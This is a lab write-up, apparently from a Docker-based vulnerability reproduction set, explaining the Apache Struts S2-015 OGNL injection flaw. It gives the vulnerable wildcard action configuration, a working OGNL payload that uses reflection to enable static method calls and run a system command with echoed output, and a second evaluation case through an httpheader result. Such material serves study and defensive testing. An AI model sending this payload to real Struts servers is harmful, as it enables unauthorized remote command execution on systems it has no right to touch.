# S2-015 Remote Code Execution Vulnerability

Impact version: 2.0.0 - 2.3.14.2

Vulnerability details:

 - http://struts.apache.org/docs/s2-015.html

## Test environment construction

```
Docker-compose build
Docker-compose up -d
```

## Principles and Testing

The vulnerability arises when the Action wildcard * is configured and used as a dynamic value, and its content is evaluated as an OGNL expression, for example:

```xml
<package name="S2-015" extends="struts-default">
    <action name="*" class="com.demo.action.PageAction">
        <result>/{1}.jsp</result>
    </action>
</package>
```

The above configuration allows us to use name.jsp to render the page when we access name.action, but when we extract the name and parse it, we perform an OGNL expression parsing, which causes the command to execute. In the practice of recurring, I found that because the location of the name value is special, some special characters such as / " \ can not be used (escaped also not), so when using this point for remote command execution, some commands with a path It may not be successful.

It should also be noted that in the update of Struts 2.3.14.1 - Struts 2.3.14.2, the setAllowStaticMethodAccess method in the SecurityMemberAccess class has been removed, so after version 2.3.14.2, you cannot directly pass `#_memberAccess['allowStaticMethodAccess']= True` to modify its value to achieve the ability to regain static method calls.

Here in order to reach the execution of the command can be solved by calling the dynamic method (new java.lang.ProcessBuilder('calc')).start() mentioned by kxlzx, and indirectly by means of the Java reflection mechanism:

```
#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true)
```

You can construct Payload as follows:

```
${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true ),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#q}
```

Direct echo:

![](01.png)

In addition to the above mentioned situation, S2-015 also covers a case of secondary reference execution:

```xml
<action name="param" class="com.demo.action.ParamAction">
    <result name="success" type="httpheader">
        <param name="error">305</param>
        <param name="headers.fxxk">${message}</param>
    </result>
</action>
```

Here is configured ``param name="errorMessage">${message}</param>`, where message is a private variable in ParamAction, so configuration will cause Struts2 to get the message from the request parameter when the Result is triggered. The value, and during the parsing process, triggers the OGNL expression execution, so committing only with commit %{1111*2} as its variable value will be executed. The important thing to note here is that the secondary parsing here is caused by using ${param} in struts.xml to reference variables in Action, not for type="httpheader".

![](02.png)